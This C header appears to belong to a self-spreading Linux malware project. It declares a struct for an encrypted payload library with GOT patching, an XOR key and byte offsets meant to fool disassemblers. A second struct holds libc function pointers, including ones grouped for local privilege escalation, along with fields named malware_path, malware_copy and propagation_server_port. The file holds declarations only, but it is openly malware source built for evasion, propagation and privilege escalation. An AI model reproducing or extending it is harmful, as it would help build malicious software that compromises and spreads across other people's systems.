#pragma once
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>   // For sysconf
#include <dlfcn.h>    // For dlsym
#include <poll.h>

#include <ifaddrs.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <pthread.h>

typedef struct malibrary{
    size_t n_got_mappings;      // number of GOT mappings
    uint64_t *got_offsets;      // list of GOT offsets (where the GOT entry is located)
    uint64_t *got_targets;      // list of GOT targets (where the GOT entry should point)
    char *data;                 // the actual data of the library
    size_t data_length;         // the size of the data
    size_t entry_offset;        // the offset of the entry function within the data
    uint64_t key;               // the key to encrypt/decrypt the data
    uint64_t elf_offset_data;   // the offset of the data within the packed and compiled loader
    uint64_t elf_offset_key;    // the offset of the key within the packed and compiled loader
    size_t n_fools_offsets;     // number of fools offsets
    uint64_t *fools_offsets;    // list of offsets where bytes for linear sweep fooling are placed
} MaLib;

typedef struct globals{
    // misc
    void (*exit)(int __status);
    unsigned int (*sleep) (unsigned int __seconds);
    int (*usleep)(unsigned int __useconds);
    int (*sleep_ms)(unsigned int ms);

    // strings
    char *(*getcwd)(char *buf, size_t size);
    int (*snprintf)(char *__s, size_t __maxlen, const char * __format, ...);
    int (*fprintf)(FILE *__restrict__ __stream, const char *__restrict__ __format, ...);
    int (*printf)(const char *__restrict__ __format, ...);
    void (*perror)(const char *__s);
    char *(*strerror)(int __errnum);
    size_t (*strlen)(const char *__s);
    int (*strcmp)(const char *__s1, const char *__s2);
    char *(*strstr)(const char *__haystack, const char *__needle);
    char *(*strncpy)(char *__restrict__ __dest, const char *__restrict__ __src, size_t __n);
    int (*sscanf)(const char *__restrict__ __s, const char *__restrict__ __format, ...);

    // memory
    void *(*memcpy)(void *__restrict__ __dest, const void *__restrict__ __src, size_t __n);
    void *(*memset)(void *__s, int __c, size_t __n);

    // files
    char *(*realpath)(const char *restrict path, char *restrict resolved_path);
    FILE *(*fopen)(const char *__restrict__ __filename, const char *__restrict__ __modes);
    size_t (*fread)(void *__restrict__ __ptr, size_t __size, size_t __n, FILE *__restrict__ __stream);
    size_t (*fwrite) (const void *__restrict __ptr, size_t __size, size_t __n, FILE *__restrict __s);
    int (*fseek)(FILE *__stream, long __off, int __whence);
    long (*ftell)(FILE *__stream);
    int (*fclose)(FILE *__stream);
    void (*rewind)(FILE *__stream);
    ssize_t (*write)(int __fd, const void *__buf, size_t __n);
    int (*close)(int __fd);
    int (*mkdir) (const char *__path, __mode_t __mode);

    // errno
    int *(*__errno_location) (void);


    // heap
    void *(*malloc)(size_t __size);
    void *(*calloc) (size_t __nmemb, size_t __size);
    void (*free)(void *__ptr);


    // functions used in lpe
    ssize_t (*readlink) (const char *__restrict __path,
                             char *__restrict __buf, size_t __len);
   __uid_t (*geteuid) (void);

   int (*execve) (const char *__path, char *const __argv[],
		   char *const __envp[]);

   __pid_t (*fork) (void);



    // network
    uint32_t (*htonl)(uint32_t __hostlong);
    uint16_t (*htons)(uint16_t __hostshort);
    uint32_t (*ntohl)(uint32_t __netlong);
    uint16_t (*ntohs)(uint16_t __netshort);
    char *(*inet_ntoa)(struct in_addr __in);
    const char *(*inet_ntop)(int __af, const void *__restrict__ __cp, char *__restrict__ __buf, socklen_t __len);

    int (*socket)(int __domain, int __type, int __protocol);
    int (*setsockopt)(int __fd, int __level, int __optname, const void *__optval, socklen_t __optlen);
    int (*bind)(int __fd, const struct sockaddr *__addr, socklen_t __len);
    int (*listen)(int __fd, int __n);
    int (*accept)(int __fd, struct sockaddr *__restrict__ __addr, socklen_t *__restrict__ __addr_len);
    int (*getifaddrs)(struct ifaddrs **__ifap);
    void (*freeifaddrs)(struct ifaddrs *__ifa);
    int (*getsockname)(int __fd, struct sockaddr *__restrict__ __addr, socklen_t *__restrict__ __len);

    ssize_t (*recv)(int __fd, void *__buf, size_t __n, int __flags);
    ssize_t (*send)(int __fd, const void *__buf, size_t __n, int __flags);
    ssize_t (*recvfrom)(int __fd, void *__restrict__ __buf, size_t __n, int __flags, __SOCKADDR_ARG __addr, socklen_t *__restrict__ __addr_len);
    ssize_t (*sendto)(int __fd, const void *__buf, size_t __n, int __flags, __CONST_SOCKADDR_ARG __addr, socklen_t __addr_len);

    int (*poll)(struct pollfd *__fds, nfds_t __nfds, int __timeout);
    int (*ioctl) (int __fd, unsigned long int __request, ...);

    // threads
    int (*pthread_create)(pthread_t *__restrict__ __newthread, const pthread_attr_t *__restrict__ __attr, void *(*__start_routine)(void *), void *__restrict__ __arg);
    int (*pthread_detach)(pthread_t __th);
    void (*pthread_exit)(void *__retval);

    // fds
    FILE *stdout;
    FILE *stderr;

    // misc
    int (*rand)(void);

    // global variables
    char * malware_path;
    char * malware_copy;
    size_t malware_size;
    void * lib_mem;
    MaLib * lib;
    int propagation_server_port;
    int ipp_server_port;

    // custom functions
    void (*xor_memory_layered)(void * memory, size_t len, char*key, int layer);
    void (*encrypt_layered)(void *memory, size_t len, char* key);
    void (*decrypt_layered)(void *memory, size_t len, char* key);

} Globals;
